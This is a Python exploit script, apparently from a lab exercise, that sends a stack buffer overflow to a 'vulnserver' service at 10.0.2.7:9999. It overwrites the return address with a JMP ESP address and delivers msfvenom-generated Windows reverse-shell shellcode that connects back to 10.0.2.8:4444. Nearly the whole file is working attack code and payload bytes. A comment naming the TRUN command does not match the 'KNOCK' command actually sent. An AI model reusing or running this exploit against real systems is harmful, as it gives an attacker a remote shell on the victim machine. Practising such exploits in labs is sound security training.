# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.7'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8
#   LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a'
SHELL =  b""
SHELL += b"\xba\xc7\xf2\xb9\x72\xdb\xc3\xd9\x74\x24\xf4\x5e"
SHELL += b"\x33\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x91"
SHELL += b"\xfc\x5b\x87\xe1\xe9\x1e\x68\x19\xea\x7e\xe0\xfc"
SHELL += b"\xdb\xbe\x96\x75\x4b\x0f\xdc\xdb\x60\xe4\xb0\xcf"
SHELL += b"\xf3\x88\x1c\xe0\xb4\x27\x7b\xcf\x45\x1b\xbf\x4e"
SHELL += b"\xc6\x66\xec\xb0\xf7\xa8\xe1\xb1\x30\xd4\x08\xe3"
SHELL += b"\xe9\x92\xbf\x13\x9d\xef\x03\x98\xed\xfe\x03\x7d"
SHELL += b"\xa5\x01\x25\xd0\xbd\x5b\xe5\xd3\x12\xd0\xac\xcb"
SHELL += b"\x77\xdd\x67\x60\x43\xa9\x79\xa0\x9d\x52\xd5\x8d"
SHELL += b"\x11\xa1\x27\xca\x96\x5a\x52\x22\xe5\xe7\x65\xf1"
SHELL += b"\x97\x33\xe3\xe1\x30\xb7\x53\xcd\xc1\x14\x05\x86"
SHELL += b"\xce\xd1\x41\xc0\xd2\xe4\x86\x7b\xee\x6d\x29\xab"
SHELL += b"\x66\x35\x0e\x6f\x22\xed\x2f\x36\x8e\x40\x4f\x28"
SHELL += b"\x71\x3c\xf5\x23\x9c\x29\x84\x6e\xc9\x9e\xa5\x90"
SHELL += b"\x09\x89\xbe\xe3\x3b\x16\x15\x6b\x70\xdf\xb3\x6c"
SHELL += b"\x77\xca\x04\xe2\x86\xf5\x74\x2b\x4d\xa1\x24\x43"
SHELL += b"\x64\xca\xae\x93\x89\x1f\x60\xc3\x25\xf0\xc1\xb3"
SHELL += b"\x85\xa0\xa9\xd9\x09\x9e\xca\xe2\xc3\xb7\x61\x19"
SHELL += b"\x84\xbd\x75\x23\x5e\xaa\x77\x23\x4f\x76\xf1\xc5"
SHELL += b"\x05\x96\x57\x5e\xb2\x0f\xf2\x14\x23\xcf\x28\x51"
SHELL += b"\x63\x5b\xdf\xa6\x2a\xac\xaa\xb4\xdb\x5c\xe1\xe6"
SHELL += b"\x4a\x62\xdf\x8e\x11\xf1\x84\x4e\x5f\xea\x12\x19"
SHELL += b"\x08\xdc\x6a\xcf\xa4\x47\xc5\xed\x34\x11\x2e\xb5"
SHELL += b"\xe2\xe2\xb1\x34\x66\x5e\x96\x26\xbe\x5f\x92\x12"
SHELL += b"\x6e\x36\x4c\xcc\xc8\xe0\x3e\xa6\x82\x5f\xe9\x2e"
SHELL += b"\x52\xac\x2a\x28\x5b\xf9\xdc\xd4\xea\x54\x99\xeb"
SHELL += b"\xc3\x30\x2d\x94\x39\xa1\xd2\x4f\xfa\xc1\x30\x45"
SHELL += b"\xf7\x69\xed\x0c\xba\xf7\x0e\xfb\xf9\x01\x8d\x09"
SHELL += b"\x82\xf5\x8d\x78\x87\xb2\x09\x91\xf5\xab\xff\x95"
SHELL += b"\xaa\xcc\xd5"

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
